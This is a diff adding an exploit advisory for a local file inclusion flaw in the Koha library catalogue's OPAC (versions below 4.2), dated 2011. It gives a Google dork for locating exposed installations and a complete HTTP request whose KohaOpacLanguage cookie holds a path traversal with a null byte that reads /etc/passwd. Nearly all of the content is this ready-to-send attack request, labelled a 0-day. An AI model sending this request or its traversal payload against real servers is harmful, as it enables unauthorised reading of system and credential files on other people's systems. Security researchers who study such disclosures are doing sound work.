@@ -1,0 +1,24 @@
+# Exploit Title: [Koha Opac Local File Inclusion]
+ # Google Dork: [inurl:koha/opac-main.pl] 
+ # Date: [17.11.2011]
+ # Author: [Akin Tosunlar(Vigasis Labs)]
+ # Software Link: [www.koha.org]
+ # Version: [<4.2]
+# Tested on: [Linux(Apache 2.2.14)]
+# CVE : []
+
+# Vigasis Pentest Team (www.vigasis.com)
+# 0-Day Exploit
+# Akin Tosunlar
+# Special Thanks to Ozgur Yurdusev
+
+#Exploit
+
+GET /cgi-bin/koha/opac-main.pl HTTP/1.0
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
+Cookie: sessionID=1;KohaOpacLanguage=../../../../../../../../etc/passwd%00
+Connection: Close
+Pragma: no-cache
+Host: localhost
+
